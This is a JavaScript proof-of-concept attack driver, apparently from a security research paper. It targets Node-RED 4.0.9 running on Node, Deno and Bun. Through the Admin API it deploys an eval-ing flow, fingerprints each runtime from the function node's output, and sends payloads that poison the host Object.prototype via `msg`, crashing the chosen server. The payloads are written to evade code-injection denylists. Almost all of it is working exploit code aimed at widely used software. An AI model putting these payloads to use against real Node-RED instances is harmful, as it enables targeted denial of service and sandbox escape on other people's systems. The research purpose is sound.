// MASHQ Node-RED minimal PoC — attacker driver.
//
// Against three IDENTICAL Node-RED 4.0.9 victims (Node / Deno / Bun), with no
// out-of-band knowledge, this driver:
//   Stage 1 — fingerprints each function-node sandbox from its OUTPUT ALONE, and
//   Stage 2 — detonates a runtime-targeted payload, producing a 3x3 discrimination
//             matrix (each payload downs only its intended runtime; the other two
//             keep serving).
//
// The fingerprint is the paper's Fig. 7 (fig:minimal_poc_nodered): a CallSite
// constructor probe (Error.prepareStackTrace) + an Intl/ICU signal (the AFN
// currency's minimumFractionDigits), decided as  !cs ? node : (afn===2 ? bun : deno).
//
// Notes specific to Node-RED:
//  * Submission surface = Admin API POST /flows + POST /run (evals in a function node).
//  * The function node is NOT a real sandbox: the host object `msg` bridges to the
//    host realm. Object.getPrototypeOf(msg) IS the host Object.prototype, so
//    poisoning it detonates the host with NO `process`/`require`/`constructor`/
//    `Function`/`eval` token anywhere in the attacker payload.
//  * Bun's Node-RED http-response node only answers ONCE per process lifetime, so
//    every interaction is: restart -> deploy -> exactly ONE /run -> health via /settings.
//
// Client-only deps: Node builtins (child_process/fs/http) + `docker compose`.
// Run:  docker compose up -d --build   &&   node driver.mjs
import { execFileSync } from 'node:child_process';
import { writeFileSync } from 'node:fs';
import http from 'node:http';

const RT = {
  node: { svc: 'nr-node', port: 1881 },
  deno: { svc: 'nr-deno', port: 1882 },
  bun:  { svc: 'nr-bun',  port: 1893 },
};
const RTS = Object.keys(RT);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const DIR = import.meta.dirname;

// The flow the attacker deploys: http in(/run) -> function(eval) -> http response.
const FLOW = [
  { id: 'tab1', type: 'tab', label: 'poc' },
  { id: 'in_run', type: 'http in', z: 'tab1', url: '/run', method: 'post', wires: [['fn_run']] },
  { id: 'fn_run', type: 'function', z: 'tab1', name: 'run',
    func: "let code=(msg.payload&&msg.payload.code)||'';try{msg.payload=String(eval(code));}catch(e){msg.payload='ERR:'+(e&&e.message);}return msg;",
    outputs: 1, wires: [['resp_run']] },
  { id: 'resp_run', type: 'http response', z: 'tab1', statusCode: '200' },
];

// Paper Fig. 7 fingerprint as a one-line JS expression returning 'node'|'deno'|'bun'.
// Benign primitives only — no process/require/eval/Function/Temporal. Reused both in
// the probe and to fingerprint-gate the Deno matrix payload below.
const FP_RT = "(function(){ var cs,o=Error.prepareStackTrace; try{Error.prepareStackTrace=function(e,s){return s;};var C=Error().stack[0].constructor;new C(C,6).toString();cs=true;}catch(e){cs=false;}finally{Error.prepareStackTrace=o;} var afn;try{afn=Intl.NumberFormat([],{style:'currency',currency:'AFN'}).resolvedOptions().minimumFractionDigits;}catch(e){afn=-1;} return !cs?'node':(afn===2?'bun':'deno'); })()";

// Combined introspection + fingerprint probe (one /run). The `intro` block shows
// direct interrogation is denied; the `fp` block is the Fig. 7 fingerprint, exposing
// the raw signals (callsite, afn) plus the decided runtime.
const PROBE = `(function(){
  var cs, o = Error.prepareStackTrace;
  try { Error.prepareStackTrace = function(e,s){ return s; }; var C = Error().stack[0].constructor; new C(C,6).toString(); cs = true; }
  catch (e) { cs = false; } finally { Error.prepareStackTrace = o; }
  var afn; try { afn = Intl.NumberFormat([], {style:'currency', currency:'AFN'}).resolvedOptions().minimumFractionDigits; } catch(e){ afn = -1; }
  return JSON.stringify({
    intro: { process: typeof process, Deno: typeof Deno, Bun: typeof Bun,
             fn: (function(){ try { return typeof (Function('return process')()); } catch(e){ return 'blocked:'+e.name; } })() },
    fp: { callsite: cs, afn: afn, rt: !cs ? 'node' : (afn === 2 ? 'bun' : 'deno') }
  });
})()`;
const infer = (fp) => !fp ? 'unknown' : (!fp.callsite ? 'node' : (fp.afn === 2 ? 'bun' : 'deno'));

// PROCESS-FREE detonation. Reach the HOST Object.prototype directly through the
// host object `msg` — Object.getPrototypeOf(msg) IS the host prototype (msg is a
// host object), so defineProperty on it poisons host intrinsics with NO realm
// switch. The attacker payload therefore contains no `process`, `require`,
// `constructor`, `Function`, or `eval` — only Object.getPrototypeOf/defineProperty
// and a throwing getter, none of which a code-injection denylist can match without
// breaking legitimate function-node code.
const POISON = (name, desc) => `Object.defineProperty(Object.getPrototypeOf(msg),${JSON.stringify(name)},${desc})`;
const PAYLOADS = {
  node: { intrinsic: true,
    code: POISON('chunkedEncoding', `{get(){throw new Error('ce')},configurable:true}`),
    note: "Node native http writes chunkedEncoding; Deno's node:http shim and Bun do not" },
  bun: { intrinsic: true,
    code: POISON('headers', `{get(){throw new Error('hp')},configurable:true}`),
    note: "Bun http reads .headers on a plain object; Node & Deno do not that way" },
  deno: { intrinsic: false,
    code: `if (${FP_RT} === 'deno') { ${POISON('_readableState', `{get(){throw new Error('rs')},configurable:true}`)} }`,
    note: "fingerprint-GATED (paper Fig. 7 fingerprint): arms only on Deno, then a universal http breaker. No Deno-only intrinsic crash exists on Node-RED (Deno's node:http shim is a strict subset)." },
};

function req(port, method, path, body, ms = 6000) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = { 'Content-Type': 'application/json' };
    if (path === '/flows') headers['Node-RED-Deployment-Type'] = 'full';
    if (data) headers['Content-Length'] = Buffer.byteLength(data);
    const r = http.request({ host: '127.0.0.1', port, path, method, agent: false, headers }, (res) => {
      let d = ''; res.on('data', (c) => (d += c)); res.on('end', () => resolve({ status: res.statusCode, text: d }));
    });
    r.on('error', (e) => resolve({ status: 0, text: 'ERR:' + e.code }));
    r.setTimeout(ms, () => { r.destroy(); resolve({ status: 0, text: 'TIMEOUT' }); });
    if (data) r.write(data); r.end();
  });
}
const restart = (svc) => execFileSync('docker', ['compose', 'restart', svc], { cwd: DIR, stdio: 'ignore' });
async function waitUp(port, tries = 60) { for (let i = 0; i < tries; i++) { const r = await req(port, 'GET', '/settings', null, 1500); if (r.status === 200) return true; await sleep(1000); } return false; }
async function waitDown(port, tries = 10) { for (let i = 0; i < tries; i++) { const r = await req(port, 'GET', '/settings', null, 1200); if (r.status !== 200) return true; await sleep(400); } return false; }
async function freshDeploy(rt) { const { svc, port } = RT[rt]; restart(svc); if (!(await waitUp(port))) return false; await req(port, 'POST', '/flows', FLOW); await sleep(800); return true; }

async function main() {
  const results = { startedAt: new Date().toISOString(), nodeRed: '4.0.9',
    versions: { node: '24.1.0', deno: '2.3.3', bun: '1.2.14' },
    introspection: {}, fingerprint: {}, matrix: {}, summary: {} };
  const log = (...a) => console.log(...a);
  log('\n=== MASHQ Node-RED attacker driver ===');

  // --- Stage 1: introspection + fingerprint (one probe per victim) ---
  log('\n--- Criterion 1 + Stage 1 (introspection / fingerprint) ---');
  let correct = 0;
  for (const rt of RTS) {
    if (!(await freshDeploy(rt))) { log(`  ${rt}: did not come up`); continue; }
    const r = await req(RT[rt].port, 'POST', '/run', { code: PROBE });
    let p = null; try { p = JSON.parse(r.text); } catch {}
    const inferred = infer(p?.fp);
    if (inferred === rt) correct++;
    results.introspection[rt] = p?.intro || null;
    results.fingerprint[rt] = { inferred, truth: rt, correct: inferred === rt, signals: p?.fp || null };
    log(`  ${rt.padEnd(4)} introspection=${JSON.stringify(p?.intro)}  inferred=${inferred} (truth=${rt}) ${inferred === rt ? 'OK' : 'WRONG'}`);
  }
  log(`  fingerprint accuracy: ${correct}/${RTS.length}`);

  // --- Stage 2: 3x3 discrimination matrix ---
  log('\n--- Stage 2: 3x3 discrimination matrix (restart -> submit -> health) ---');
  for (const prt of RTS) {
    results.matrix[prt] = {};
    for (const drt of RTS) {
      if (!(await freshDeploy(drt))) { results.matrix[prt][drt] = 'ERR'; continue; }
      await req(RT[drt].port, 'POST', '/run', { code: PAYLOADS[prt].code }, 4000);
      const down = await waitDown(RT[drt].port);
      results.matrix[prt][drt] = down ? 'DOWN' : 'UP';
      log(`  payload=${prt.padEnd(4)} -> ${drt.padEnd(4)} : ${down ? 'DOWN' : 'UP'}`);
    }
  }

  // --- Summary ---
  const targetedDetonation = RTS.every((rt) => results.matrix[rt][rt] === 'DOWN');
  let stealth = true;
  for (const prt of RTS) for (const drt of RTS) if (prt !== drt && results.matrix[prt][drt] !== 'UP') stealth = false;
  results.summary = {
    fingerprintAccuracy: `${correct}/${RTS.length}`,
    targetedDetonation, stealth,
    payloadKind: Object.fromEntries(Object.entries(PAYLOADS).map(([k, v]) => [k, v.intrinsic ? 'intrinsic' : 'fingerprint-gated'])),
    note: 'deno payload is fingerprint-gated: no Deno-only intrinsic crash exists on Node-RED (Deno node:http shim is a strict subset of Node native).',
  };
  results.finishedAt = new Date().toISOString();

  log('\n=== 3x3 matrix (rows = payload, cols = deployment) ===');
  log('           node    deno    bun');
  for (const prt of RTS) log(`  ${prt.padEnd(6)}   ${RTS.map((d) => (results.matrix[prt][d] || '?').padEnd(7)).join(' ')}`);
  log('\nsummary:', JSON.stringify(results.summary, null, 2));

  writeFileSync(`${DIR}/results.json`, JSON.stringify(results, null, 2));
  log(`\nwrote results.json`);
}
main().catch((e) => { console.error('DRIVER ERROR:', e); process.exit(1); });
